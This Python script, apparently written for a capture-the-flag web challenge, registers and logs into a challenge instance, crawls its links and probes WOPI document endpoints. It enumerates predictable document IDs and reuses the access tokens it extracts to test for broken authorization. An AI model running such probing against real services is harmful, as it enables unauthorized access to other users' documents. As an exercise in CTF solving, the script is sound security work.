#!/usr/bin/env python3
"""Temporary CTF HTTP probe. No repository secrets are used or sent."""
import http.cookiejar
import html
import html.parser
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
EMAIL = "arena-93aa1301@corp"
PASSWORD = "Arena-93aa1301-CTF!"
NAME = "arena"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
opener.addheaders = [("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131 Safari/537.36")]


class FormParser(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.assets = []
        self.links = []
        self._form = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._form = {"action": a.get("action", ""), "method": a.get("method", "get"), "inputs": []}
            self.forms.append(self._form)
        elif tag in ("input", "textarea", "select") and self._form is not None:
            self._form["inputs"].append({"tag": tag, **a})
        elif tag == "script" and a.get("src"):
            self.assets.append(a["src"])
        elif tag == "link" and a.get("href"):
            self.assets.append(a["href"])
        elif tag == "a" and a.get("href"):
            self.links.append(a["href"])

    def handle_endtag(self, tag):
        if tag == "form":
            self._form = None


def request(path, data=None, max_body=120000):
    url = urllib.parse.urljoin(BASE + "/", path)
    print("\n" + "=" * 30, "REQUEST", data and "POST" or "GET", url, flush=True)
    if data is not None:
        print("FORM", {k: ("<redacted>" if "pass" in k.lower() else v) for k, v in data.items()}, flush=True)
        data = urllib.parse.urlencode(data).encode()
    try:
        with opener.open(url, data=data, timeout=30) as r:
            raw = r.read(max_body)
            text = raw.decode("utf-8", "replace")
            print("STATUS", r.status, "FINAL", r.url, flush=True)
            print("HEADERS\n" + str(r.headers), flush=True)
            shown = re.sub(r"<style\b[^>]*>.*?</style>", "<style>/* omitted */</style>", text, flags=re.S | re.I)
            print("BODY\n" + shown, flush=True)
            print("COOKIES", [(c.name, c.value) for c in jar], flush=True)
            return text, r.url
    except urllib.error.HTTPError as e:
        text = e.read(max_body).decode("utf-8", "replace")
        print("HTTP ERROR", e.code, e.headers, text, flush=True)
        return text, e.url
    except Exception as e:
        print("ERROR", repr(e), flush=True)
        return "", url


def parse(text):
    p = FormParser()
    p.feed(text)
    print("PARSED", {"forms": p.forms, "assets": p.assets, "links": p.links}, flush=True)
    return p


def submit_form(path, login=False):
    text, _ = request(path)
    p = parse(text)
    if not p.forms:
        return
    form = p.forms[0]
    fields = {}
    for i in form["inputs"]:
        name = i.get("name")
        if not name:
            continue
        typ = i.get("type", "text").lower()
        if typ == "hidden":
            fields[name] = i.get("value", "")
        elif typ == "email" or "mail" in name.lower() or "login" in name.lower():
            fields[name] = EMAIL
        elif typ == "password" or "pass" in name.lower():
            fields[name] = PASSWORD
        elif typ not in ("submit", "button", "checkbox", "radio"):
            fields[name] = NAME
    action = form["action"] or path
    if form["method"].lower() == "post":
        text, _ = request(action, fields)
        parse(text)
    else:
        print("Form is not POST; fields inferred:", fields, flush=True)


# Registration is idempotent for this fixed CTF account: on later runs the
# subsequent login simply uses the account created by the first run.
submit_form("/register")
login_text, _ = request("/login", max_body=50000)
p = parse(login_text)
if p.forms:
    form = p.forms[0]
    fields = {}
    for i in form["inputs"]:
        n = i.get("name")
        if not n:
            continue
        typ = i.get("type", "text").lower()
        if typ == "hidden":
            fields[n] = i.get("value", "")
        elif typ == "email" or "mail" in n.lower() or "login" in n.lower():
            fields[n] = EMAIL
        elif typ == "password" or "pass" in n.lower():
            fields[n] = PASSWORD
    if form["method"].lower() == "post":
        text, final = request(form["action"] or "/login", fields)
        parse(text)

home, final = request("/", max_body=150000)
hp = parse(home)
shared, _ = request("/shared", max_body=100000)
parse(shared)

# Follow all non-destructive links exposed by the document list (including share).
seen = set()
for link in hp.links:
    if link in seen or link in ("/", "/shared") or "delete" in link or "logout" in link:
        continue
    if link.startswith("/"):
        seen.add(link)
        body, _ = request(link, max_body=100000)
        parse(body)

# Probe WOPI object authorization with predictable neighbouring document IDs.
for docid in ("d0", "d1", "d2"):
    editor, _ = request("/edit/" + docid, max_body=80000)
    parse(editor)
    match = re.search(r'<iframe[^>]+src=["\']([^"\']+)', editor, re.I)
    if not match:
        continue
    iframe = html.unescape(match.group(1))
    query = urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)
    token = query.get("access_token", [""])[0]
    print("WOPI", docid, "IFRAME", iframe, "TOKEN_LENGTH", len(token), flush=True)
    if docid == "d1":
        cool, _ = request(iframe, max_body=60000)
        parse(cool)
    for suffix in ("", "/contents"):
        path = "/wopi/files/" + docid + suffix + "?access_token=" + urllib.parse.quote(token)
        request(path, max_body=100000)
